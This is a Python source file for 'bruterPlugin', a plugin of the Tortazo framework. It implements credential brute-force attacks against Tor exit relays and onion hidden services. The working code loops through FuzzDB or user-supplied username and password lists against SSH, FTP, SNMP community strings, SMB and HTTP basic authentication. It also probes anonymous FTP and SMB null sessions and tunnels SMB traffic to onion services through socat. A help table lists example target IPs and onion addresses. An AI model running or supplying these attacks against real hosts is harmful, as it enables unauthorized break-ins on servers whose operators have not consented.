# coding=utf-8
'''
Created on 22/01/2014

#Author: Adastra.
#twitter: @jdaanial

bruterPlugin.py

bruterPlugin is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

bruterPlugin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Tortazo; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
'''

from core.tortazo.pluginManagement.BasePlugin import BasePlugin
from prettytable import PrettyTable
import socket
import os
import sys
import time
from socket import error as socket_error
import signal
import paramiko

class bruterPlugin(BasePlugin):
    '''
    Class to  implement a bruteforce plugin against TOR exit nodes and hidden services in the deep web.
    '''

    def __init__(self, torNodes=[]):
        BasePlugin.__init__(self, torNodes, 'bruterPlugin')
        self.setPluginDetails('bruterPlugin', "Bruteforce plugin for services in the deep web. TIP: If you run this plugin in SSH Brute force mode, don't activate the -v/..verbose. If you use that option, you'll see a lot of debug message traced by Paramiko library.", '1.0', 'Adastra: @jdaanial')
        if len(torNodes) > 0:
            self.info("[*] bruterPlugin Initialized!")
        self.bruteForceData = {}
        for torNode in self.torNodes:
            openPorts = []
            for port in torNode.openPorts:
                openPorts.append(port.port)
                if len(openPorts) > 0:
                    self.bruteForceData[torNode.host] = openPorts
        self.separator = ":"


    def __del__(self):
        if len(self.torNodes) > 0:
            self.info("[*] bruterPlugin Destroyed!")

    def setDictSeparator(self, separator):
        print "[+] Setting separator '%s' for dictionary files. Every line en the file must contain <user><separator><passwd>" %(separator)
        self.separator = separator

    ################################################################################################################################################
    ###########################FUNCTIONS TO PERFORM SSH BRUTEFORCE ATTACKS.#########################################################################
    ################################################################################################################################################
    def sshBruterOnRelay(self, relay, port=22, dictFile=None, force=False):
        if self.bruteForceData.has_key(relay) == False and force==False:
            print "[-] IP Adress %s not found in the relays. If you want to run the scan against this host, use the parameter 'force=True' of this function" %(relay)
            return
        if force == False and port not in self.bruteForceData[relay]:
            print "[-] Port %s in the selected relay is 'closed' in the information recorded in database. If you think that it's really open, use the parameter 'force=True' of this function" %(str(port))
            return

        print "[+] Starting SSH BruteForce mode against %s on port %s" %(relay, str(port))

        if dictFile is None:
            print "[+] No specified 'dictFile'. Using FuzzDB Project to execute the attack."
            usersList = self.fuzzDBReader.getUserlistFromFuzzDB()
            passList = self.fuzzDBReader.getPasslistFromFuzzDB()
            stop_attack = False
            for user in usersList:
                if stop_attack:
                    break
                for passwd in passList:
                    try:
                        if self.serviceConnector.performSSHConnection(relay, port, user, passwd):
                            print "[+] SSH BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                            stop_attack = True
                            break
                    except:
                        print "[-] Captured exception. Finishing attack. "
                        print "[-] Exception Trace: "
                        print sys.exc_info()
                        return
        else:
            print "[+] Using the 'dictFile' stored in %s. Verifing the file. " %(dictFile)
            if os.path.exists(dictFile) == False or os.path.isfile(dictFile) == False:
                print "[-] The file selected doesn't exists or is a directory."
                return
            for line in open(dictFile, "r").readlines():
                [user, passwd] = line.strip().split(self.separator)
                try:
                    if self.serviceConnector.performSSHConnection(relay, port, user, passwd):
                        print "[+] SSH BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                        break
                except:
                    print "[-] Captured exception. Finishing attack."
                    print "[-] Exception Trace: "
                    print sys.exc_info()
                    return

            
    def sshBruterOnAllRelays(self, port=22, dictFile=None, force=False):
        for relay in self.bruteForceData:
            self.sshBruterOnRelay(relay=relay, port=port, dictFile=dictFile, force=force)

    def sshBruterOnHiddenService(self, onionService, port=22, dictFile=None):
        if len(onionService) != 22 and onionService.endswith('.onion') == False:
            print "[-] Invalid Onion Adress %s must contain 16 characters. The TLD must be .onion" %(onionService)
            return

        print "[+] Starting SSH BruteForce mode against %s on port %s" %(onionService, str(port))
        if dictFile is None:
            print "[+] No specified 'dictFile'. Using FuzzDB Project to execute the attack."
            usersList = self.fuzzDBReader.getUserlistFromFuzzDB()
            passList = self.fuzzDBReader.getPasslistFromFuzzDB()
            stop_attack = False
            for user in usersList:
                if stop_attack:
                    break
                for password in passList:
                    try:
                        if self.serviceConnector.performSSHConnectionHiddenService(onionService, port, user, password):
                            print "[+] SSH BruteForce attack successfully. User %s - Passwd %s " %(user, password)
                            stop_attack = True
                            break
                    except paramiko.SSHException as sshex:
                        print "[-] Error connection with the SSH Server: %s Aborting the attack" %(sshex.message)
                        return
                    except paramiko.ProxyCommandFailure as proxyExc:
                        print "[-] Proxy Failure. Aborting the attack"
                        return
                    except socket_error as serr:
                        print serr
                        print "Connection Refused... Exiting."
                        return
        else:
            print "[+] Using the 'dictFile' stored in %s. Verifing the file. " %(dictFile)
            if os.path.exists(dictFile) == False or os.path.isfile(dictFile) == False:
                print "[-] The dictFile selected doesn't exists or is a directory."
                return
            else:
                print "Executing the dictionary attack. Be patient."
            for line in open(dictFile, "r").readlines():
                [user, password] = line.strip().split(self.separator)
                try:
                    if self.serviceConnector.performSSHConnectionHiddenService(onionService, port, user, password):
                        print "[+] SSH BruteForce attack successfully. User %s - Passwd %s " %(user, password)
                        break
                except socket_error as serr:
                    print "Connection Refused... Finishing the attack."
                    return



    ################################################################################################################################################
    ###########################FUNCTIONS TO PERFORM FTP BRUTEFORCE ATTACKS.#########################################################################
    ################################################################################################################################################
    def ftpBruterOnRelay(self, host, port=21, dictFile=None, proxy=False):
        '''
        This function is invoked by ftpBruterOnAllRelays and ftpBruterOnHiddenService.
        For this reason there's no checks to see if the host is stored in database. The user could enter the address for an onion service and this is perfectly valid.
        '''
        if proxy:
            self.serviceConnector.setSocksProxy()
        else:
            self.serviceConnector.unsetSocksProxy()
        print "[+] Starting FTP BruteForce mode against %s on port %s" %(host, str(port))
        print "[+] Trying Anonymous access in: %s " %(host)
        if self.serviceConnector.anonymousFTPAccess(host,port):
            print "[+] FTP Anonymous access allowed in % " %(host)
            return

        if dictFile is not None and os.path.exists(dictFile):
            print "[+] Reading the Passwords file %s " %(dictFile)
            for line in open(dictFile, "r").readlines():
                if len(line.strip().split(self.separator)) != 2:
                    continue
                [user, passwd] = line.strip().split(self.separator)

                try :
                    if self.serviceConnector.performFTPConnection(host,port, user=user, passwd=passwd):
                        print "[+] FTP BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                        break
                except Exception as excep:
                    print "[-] Captured exception. Finishing attack."
                    print sys.exc_info()
                    return
        else:
            print "[+] No specified 'dictFile'. Using FuzzDB Project to execute the attack."
            usersList = self.fuzzDBReader.getUserlistFromFuzzDB()
            passList = self.fuzzDBReader.getPasslistFromFuzzDB()

            try :
                for user in usersList:
                    #Same user and password are valid?
                    if self.serviceConnector.performFTPConnection(host,port, user=user, passwd=user):
                        break
                    for passwd in passList:
                        if self.serviceConnector.performFTPConnection(host,port, user=user, passwd=passwd):
                            print "[+] FTP BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                            return
            except Exception as excep:
                print "[-] Captured exception. Finishing attack."
                print sys.exc_info()
                return


    def ftpBruterOnAllRelays(self, port=21, dictFile=None):
        for relay in self.bruteForceData:
            self.ftpBruterOnRelay(relay, port=port, dictFile=dictFile)
        

    def ftpBruterOnHiddenService(self, onionService, port=21, dictFile=None):
        self.ftpBruterOnRelay(onionService,port=port, dictFile=dictFile, proxy=True)


    ################################################################################################################################################
    ###########################FUNCTIONS TO PERFORM SNMP BRUTEFORCE ATTACKS.########################################################################
    ################################################################################################################################################
    def snmpBruterOnRelay(self, host, port=161, dictFile=None):
        '''
        TOR only works on TCP, and typically SNMP works on UDP, so teorically you cann't configure an SNMP Service as Hidden Service.
        '''
        self.serviceConnector.unsetSocksProxy()
        print "[+] Starting SNMP BruteForce mode against %s on port %s" %(host, str(port))
        if dictFile is not None and os.path.exists(dictFile):
            print "[+] Reading the Passwords file %s " %(dictFile)
            for line in open(dictFile, "r").readlines():
                [user, passwd] = line.strip().split(self.separator)
                try :
                    if self.serviceConnector.performSNMPConnection(host,port, user=user, passwd=passwd):
                        print "[+] SNMP BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                        break
                except Exception as excep:
                    print "[-] Captured exception. Finishing attack."
                    print sys.exc_info()
                    return
        else:
            print "[+] No specified 'dictFile'. Using FuzzDB Project to execute the attack."
            communities = self.fuzzDBReader.getSNMPCommunitiesFromFuzzDB()
            try :
                for community in communities:
                    if self.serviceConnector.performSNMPConnection(host,port, community=community):
                        break
            except Exception as excep:
                print "[-] Captured exception. Finishing attack."
                print sys.exc_info()
                return

    def snmpBruterOnAllRelays(self, port=161, dictFile=None):
        for relay in self.bruteForceData:
            self.snmpBruterOnRelay(relay, port=port, dictFile=dictFile)

    ################################################################################################################################################
    ###########################FUNCTIONS TO PERFORM SMB BRUTEFORCE ATTACKS.#########################################################################
    ################################################################################################################################################
    def smbBruterOnRelay(self, host, port=139, dictFile=None):
        print "[+] Starting SMB BruteForce mode against %s on port %s" %(host, str(port))
        print "[+] Testing a Null-Session against the target."
        try:
            if self.serviceConnector.performSMBConnection(host, port,'',''):
                print "[+] SMB Null-Session found in host: %s " %(host)
                return
        except socket_error:
            print "Socket error detected. Are you sure that the hidden service and the TOR Socks Proxy is up and running?"
            raise


        if dictFile is not None and os.path.exists(dictFile):
            print "[+] Reading the Passwords file %s " %(dictFile)
            for line in open(dictFile, "r").readlines():
                [user, passwd] = line.strip().split(self.separator)
                try :
                    if self.serviceConnector.performSMBConnection(host,port, user=user, passwd=passwd):
                        print "[+] SMB BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                        break
                except socket_error as excep:
                    print "Socket error detected. Are you sure that the hidden service and the TOR Socks Proxy is up and running?"
                    raise
        else:
            print "[+] No specified 'dictFile'. Using FuzzDB Project to execute the attack."
            usersList = self.fuzzDBReader.getUserlistFromFuzzDB()
            passList = self.fuzzDBReader.getPasslistFromFuzzDB()

            try :
                for user in usersList:
                    #Same user and password are valid?
                    if self.serviceConnector.performSMBConnection(host,port, user=user, passwd=user):
                        print "[+] SMB BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                        break
                    for passwd in passList:
                        if self.serviceConnector.performSMBConnection(host,port, user=user, passwd=passwd):
                            print "[+] SMB BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                            return
            except socket_error as excep:
                print "Socket error detected. Are you sure that the hidden service and the TOR Socks Proxy is up and running?"
                raise
            

    def smbBruterOnAllRelays(self, port=139, dictFile=None):
        for relay in self.bruteForceData:
            self.smbBruterOnRelay(relay, port=port, dictFile=dictFile)


    def smbBruterOnHiddenService(self, onionService, servicePort=139, localPort=139, dictFile=None):
        smbSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        smbSocket.settimeout(1)
        result = smbSocket.connect_ex(('127.0.0.1',localPort))
        if result == 0:
            print "[-] The selected local port "+str(localPort)+" is being used by another process. Please, select an port available in this machine"
            return
        else:
            try:
                print "[+] Starting a local proxy with Socat to forward requests to the hidden service through the local machine and the local Socks Proxy... "
                socatProcess = self.serviceConnector.startLocalSocatTunnel(localPort,onionService,servicePort,socksPort=self.serviceConnector.socksPort)
                time.sleep(10)
                print "[+] Socat process started! PID: "+str(socatProcess.pid)
                self.smbBruterOnRelay('127.0.0.1', port=localPort, dictFile=dictFile)
                print "[+] SMB Bruter finished. Shutting down the local Socat tunnel..."
                os.killpg(socatProcess.pid, signal.SIGTERM)
            except socket_error:
                print "[+] The following exception was raised, however, shutting down the local Socat tunnel..."
                print sys.exc_info()
                os.killpg(socatProcess.pid, signal.SIGTERM)
                time.sleep(10)

    ################################################################################################################################################
    ###########################FUNCTIONS TO PERFORM HTTP BRUTEFORCE ATTACKS.########################################################################
    ################################################################################################################################################
    def httpBruterOnSite(self, url, dictFile=None, proxy=False):
        if proxy:
            self.serviceConnector.setSocksProxy()
        else:
            self.serviceConnector.unsetSocksProxy()
        print "[+] Starting HTTP BruteForce mode against %s " %(url)
        if dictFile is not None and os.path.exists(dictFile):
            print "[+] Reading the Passwords file %s " %(dictFile)
            for line in open(dictFile, "r").readlines():
                [user, passwd] = line.strip().split(self.separator)
                try :
                    if self.serviceConnector.performHTTPAuthConnection(url, user=user, passwd=passwd):
                        print "[+] HTTP BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                        break
                except Exception as excep:
                    print "[-] Captured exception. Finishing attack."
                    print sys.exc_info()
                    return
        else:
            print "[+] No specified 'dictFile'. Using FuzzDB Project to execute the attack."
            usersList = self.fuzzDBReader.getUserlistFromFuzzDB()
            passList = self.fuzzDBReader.getPasslistFromFuzzDB()

            try :
                for user in usersList:
                    #Same user and password are valid?
                    if self.serviceConnector.performHTTPAuthConnection(url, user=user, passwd=user):
                        print "[+] HTTP BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                        break
                    for passwd in passList:
                        if self.serviceConnector.performHTTPAuthConnection(url, user=user, passwd=passwd):
                            print "[+] HTTP BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                            return
            except Exception as excep:
                print "[-] Captured exception. Finishing attack."
                print sys.exc_info()
                return


    def httpBruterOnHiddenService(self, onionService, dictFile=None):
        if onionService.startswith('http://') == False:
            self.httpBruterOnSite('http://'+onionService,dictFile=dictFile, proxy=True)
        else:
            self.httpBruterOnSite(onionService,dictFile=dictFile, proxy=True)


    def help(self):
        print "[*] Functions availaible available in the Plugin..."
        tableHelp = PrettyTable(["Function", "Description", "Example"])
        tableHelp.padding_width = 1
        tableHelp.padding_width = 1
        tableHelp.add_row(['help', 'Help Banner', 'self.help()'])
        tableHelp.add_row(['printRelaysFound', 'Table with the relays found.', 'self.printRelaysFound()'])
        tableHelp.add_row(['setDictSeparator', 'Sets an separator for dictionary files. Every line en the file must contain <user><separator><passwd>.', 'self.setDictSeparator(":")'])

        tableHelp.add_row(['sshBruterOnRelay', 'Execute a bruteforce attack against an SSH Server in the relay entered. Uses FuzzDB if the dictFile is not specified.', "self.sshBruterOnRelay('37.213.43.122', dictFile='/home/user/dict')"])
        tableHelp.add_row(['sshBruterOnAllRelays', 'Execute a bruteforce attack against an SSH Server in the relays founded. Uses FuzzDB if the dictFile is not specified.', "self.sshBruterOnAllRelays(dictFile='/home/user/dict')"])
        tableHelp.add_row(['sshBruterOnHiddenService', 'Execute a bruteforce attack against an SSH Server in the onion address entered.', 'self.sshBruterOnHiddenService("5bsk3oj5jufsuii6.onion", dictFile="/home/user/dict")'])

        tableHelp.add_row(['ftpBruterOnRelay', 'Execute a bruteforce attack against an FTP Server in the relay entered.', 'self.ftpBruterOnRelay("37.213.43.122", dictFile="/home/user/dict")'])
        tableHelp.add_row(['ftpBruterOnAllRelays', 'Execute a bruteforce attack against an FTP Server in the relays founded.', 'self.ftpBruterOnAllRelays(dictFile="/home/user/dict")'])
        tableHelp.add_row(['ftpBruterOnHiddenService', 'Execute a bruteforce attack against an FTP Server in the onion address entered.', 'self.ftpBruterOnHiddenService("5bsk3oj5jufsuii6.onion", dictFile="/home/user/dict")'])

        tableHelp.add_row(['smbBruterOnRelay', 'Execute a bruteforce attack against an SMB Server in the relay entered.', 'self.smbBruterOnRelay("37.213.43.122", dictFile="/home/user/dict")'])
        tableHelp.add_row(['smbBruterOnAllRelays', 'Execute a bruteforce attack against an SMB Server in the relays founded.', 'self.ftpBruterOnAllRelays(dictFile="/home/user/dict")'])
        tableHelp.add_row(['smbBruterOnHiddenService', 'Execute a bruteforce attack against an SMB Server in the onion address entered. This function uses socat to create a local Socks proxy to route the requests from the local machine to the hidden service.', 'self.smbBruterOnHiddenService("5bsk3oj5jufsuii6.onion", servicePort=139, localPort=139, dictFile="/home/user/dict")'])

        tableHelp.add_row(['snmpBruterOnRelay', 'Execute a bruteforce attack against an SNMP Server in the relay entered.', 'self.snmpBruterOnRelay("37.213.43.122", dictFile="/home/user/dict")'])
        tableHelp.add_row(['snmpBruterOnAllRelays', 'Execute a bruteforce attack against an SNMP Server in the relays founded.', 'self.snmpBruterOnAllRelays(dictFile="/home/user/dict")'])

        tableHelp.add_row(['httpBruterOnSite', 'Execute a bruteforce attack against an web site.', 'self.httpBruterOnSite("http://eviltorrelay.com/auth/", dictFile="/home/user/dict")'])
        tableHelp.add_row(['httpBruterOnHiddenService', "Execute a bruteforce attack against an onion site (hidden service in TOR's deep web).", 'self.httpBruterOnHiddenService("http://5bsk3oj5jufsuii6.onion/auth/", dictFile="/home/user/dict")'])

        print tableHelp
